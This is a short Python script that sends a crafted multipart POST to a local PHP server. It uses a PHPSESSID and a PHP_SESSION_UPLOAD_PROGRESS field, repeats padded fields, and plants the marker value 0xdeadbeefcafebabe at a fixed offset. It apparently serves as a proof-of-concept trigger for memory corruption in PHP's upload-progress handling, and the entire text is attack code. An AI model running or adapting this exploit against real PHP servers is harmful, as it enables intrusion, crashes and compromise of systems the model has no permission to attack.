#!/usr/bin/env python3
import socket,sys,struct
N=int(sys.argv[1]) if len(sys.argv)>1 else 1
L=int(sys.argv[2]) if len(sys.argv)>2 else 63
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
v=bytearray(b'A'*L)
if L>=0x28: struct.pack_into('<Q',v,0x20,0xdeadbeefcafebabe)
for i in range(N): parts.append({'n':'g%02d'%i,'d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
